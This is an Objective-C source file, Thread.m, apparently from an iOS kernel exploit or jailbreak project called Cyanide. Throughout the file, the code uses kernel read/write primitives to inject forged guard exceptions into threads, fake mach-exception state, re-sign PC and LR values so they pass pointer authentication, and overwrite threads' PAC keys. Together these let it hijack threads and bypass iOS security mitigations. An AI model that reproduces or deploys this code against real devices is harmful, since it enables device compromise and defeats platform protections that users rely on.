//
//  Thread.m
//  Cyanide
//
//  Created by seo on 4/4/26.
//

#import "Thread.h"

#import <Foundation/Foundation.h>
#import <mach/arm/thread_status.h>
#import <ptrauth.h>
#import "../kexploit/kutils.h"
#import "../kexploit/krw.h"
#import "../kexploit/kexploit_opa334.h"

// xnu-10002.81.5/osfmk/kern/ast.h
#define AST_GUARD               0x1000

// xnu-10002.81.5/osfmk/kern/thread.h
#define TH_IN_MACH_EXCEPTION    0x8000          /* Thread is currently handling a mach exception */

// xnu-11417.140.69/bsd/sys/reason.h
#define OS_REASON_GUARD         23

#define CND_THREAD_STATE_NO_PTRAUTH       0x1U
#define CND_THREAD_STATE_IB_SIGNED_LR     0x2U
#define CND_THREAD_STATE_KERNEL_SIGNED_PC 0x4U
#define CND_THREAD_STATE_KERNEL_SIGNED_LR 0x8U
#define CND_THREAD_STATE_USER_DIVER_MASK  0xff000000U
#define CND_USER_POINTER_MASK              0x0000007fffffffffULL

bool inject_guard_exception(uint64_t thread, uint64_t code)
{
    if (!thread_get_t_tro(thread))
    {
        printf("[%s:%d] got invalid tro of thread, not injecting exception since thread is dead", __FUNCTION__, __LINE__);
        return false;
    }
    
    if(SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"18.4")) {
        kwrite32(thread + off_thread_mach_exc_info_os_reason, OS_REASON_GUARD);
        kwrite32(thread + off_thread_mach_exc_info_exception_type, 0);
        kwrite64(thread + off_thread_mach_exc_info_code, code);
    } else {
        kwrite64(thread + off_thread_guard_exc_info_code, code);
    }
    
    uint32_t ast = kread32(thread + off_thread_ast);
    ast |= AST_GUARD;
    kwrite32(thread + off_thread_ast, ast);
    return true;
}

void clear_guard_exception(uint64_t thread)
{
    if (!thread_get_t_tro(thread))
        printf("[%s:%d] invalid tro, still clearing to avoid crash\n", __FUNCTION__, __LINE__);

    uint32_t ast = kread32(thread + off_thread_ast);
    ast &= ~AST_GUARD | 0x80000000;
    kwrite32(thread + off_thread_ast, ast);
    
       
    if(SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"18.4")) {
        if(kread32(thread + off_thread_mach_exc_info_os_reason) == OS_REASON_GUARD && kread32(thread + off_thread_mach_exc_info_exception_type) == 0) {
            kwrite32(thread + off_thread_mach_exc_info_os_reason, 0);
            kwrite32(thread + off_thread_mach_exc_info_exception_type, 0);
            kwrite64(thread + off_thread_mach_exc_info_code, 0);
        }
    } else {
        kwrite64(thread + off_thread_guard_exc_info_code, 0);
    }
}

bool thread_get_state_wrapper(mach_port_t machThread, arm_thread_state64_internal *outState)
{
    mach_msg_type_number_t count = ARM_THREAD_STATE64_COUNT;
    kern_return_t kr = thread_get_state(machThread, ARM_THREAD_STATE64, (thread_state_t)outState, &count);
    if (kr != KERN_SUCCESS) {
        printf("[%s:%d] Unable to read thread state: 0x%x (%s)", __FUNCTION__, __LINE__, kr, mach_error_string(kr));
        return false;
    }
    return true;
}

bool thread_set_state_wrapper(mach_port_t machThread, uint64_t threadAddr, arm_thread_state64_internal *state)
{
    uint16_t options = 0;
    if (threadAddr) {
        options = thread_get_options(threadAddr);
        options |= TH_IN_MACH_EXCEPTION;
        thread_set_options(threadAddr, options);
    }

    kern_return_t kr = thread_set_state(machThread, ARM_THREAD_STATE64, (thread_state_t)state, ARM_THREAD_STATE64_COUNT);
    if (kr != KERN_SUCCESS) {
        printf("[%s:%d] Failed thread_set_state: 0x%x (%s)", __FUNCTION__, __LINE__, kr, mach_error_string(kr));
        return false;
    }

    if (threadAddr) {
        options &= ~TH_IN_MACH_EXCEPTION;
        thread_set_options(threadAddr, options);
    }
    return true;
}

bool thread_convert_sign_state_for_target(
    mach_port_t targetThread, arm_thread_state64_internal *state,
    uint64_t pc, uint64_t lr)
{
    if (!MACH_PORT_VALID(targetThread) || !state || (!pc && !lr)) {
        return false;
    }

#if __has_feature(ptrauth_calls)
    arm_thread_state64_t input;
    arm_thread_state64_t output;
    memset(&input, 0, sizeof(input));
    memset(&output, 0, sizeof(output));

    uint32_t flags = state->__flags & ~CND_THREAD_STATE_NO_PTRAUTH;
    if (pc) flags &= ~CND_THREAD_STATE_KERNEL_SIGNED_PC;
    if (lr) {
        flags &= ~(CND_THREAD_STATE_KERNEL_SIGNED_LR |
                   CND_THREAD_STATE_IB_SIGNED_LR);
    }
    input.__opaque_flags = flags;

    /* machine_thread_state_convert_from_user() is entered with
     * TSSF_FLAGS_NONE by thread_convert_thread_state().  Its input must use
     * the plain pc/lr discriminator even when preserved flags contain a user
     * diversifier.  convert_to_user() then applies that diversifier while it
     * signs for targetThread. */
    if (pc) {
        void *localPC = ptrauth_sign_unauthenticated(
            (void *)(uintptr_t)(pc & CND_USER_POINTER_MASK),
            ptrauth_key_process_independent_code,
            ptrauth_string_discriminator("pc"));
        arm_thread_state64_set_pc_presigned_fptr(input, localPC);
    }
    if (lr) {
        void *localLR = ptrauth_sign_unauthenticated(
            (void *)(uintptr_t)(lr & CND_USER_POINTER_MASK),
            ptrauth_key_process_independent_code,
            ptrauth_string_discriminator("lr"));
        arm_thread_state64_set_lr_presigned_fptr(input, localLR);
    }

    mach_msg_type_number_t count = ARM_THREAD_STATE64_COUNT;
    kern_return_t kr = thread_convert_thread_state(
        targetThread, THREAD_CONVERT_THREAD_STATE_FROM_SELF,
        ARM_THREAD_STATE64, (thread_state_t)&input,
        ARM_THREAD_STATE64_COUNT, (thread_state_t)&output, &count);
    if (kr != KERN_SUCCESS || count != ARM_THREAD_STATE64_COUNT ||
        output.__opaque_flags != input.__opaque_flags) {
        printf("[%s:%d] thread state conversion failed: 0x%x count=%u "
               "flags=%#x/%#x\n", __FUNCTION__, __LINE__, kr, count,
               input.__opaque_flags, output.__opaque_flags);
        return false;
    }

    uint64_t signedPC = (uint64_t)(uintptr_t)output.__opaque_pc;
    uint64_t signedLR = (uint64_t)(uintptr_t)output.__opaque_lr;
    if ((pc && (!signedPC ||
                (signedPC & CND_USER_POINTER_MASK) !=
                    (pc & CND_USER_POINTER_MASK))) ||
        (lr && (!signedLR ||
                (signedLR & CND_USER_POINTER_MASK) !=
                    (lr & CND_USER_POINTER_MASK)))) {
        printf("[%s:%d] thread state conversion returned malformed "
               "PC/LR\n", __FUNCTION__, __LINE__);
        return false;
    }

    if (pc) state->__pc = signedPC;
    if (lr) state->__lr = signedLR;
    state->__flags = output.__opaque_flags;
    return true;
#else
    if (pc) state->__pc = pc;
    if (lr) state->__lr = lr;
    return true;
#endif
}

bool thread_resume_wrapper(mach_port_t machThread)
{
    kern_return_t kr = thread_resume(machThread);
    if (kr != KERN_SUCCESS) {
        printf("[%s:%d] Unable to resume thread: 0x%x (%s)\n", __FUNCTION__, __LINE__, kr, mach_error_string(kr));
        return false;
    }
    return true;
}

void thread_set_pac_keys(uint64_t threadAddr, uint64_t keyA, uint64_t keyB)
{
    kwrite64(threadAddr + off_thread_machine_rop_pid, keyA);
    kwrite64(threadAddr + off_thread_machine_jop_pid, keyB);
}
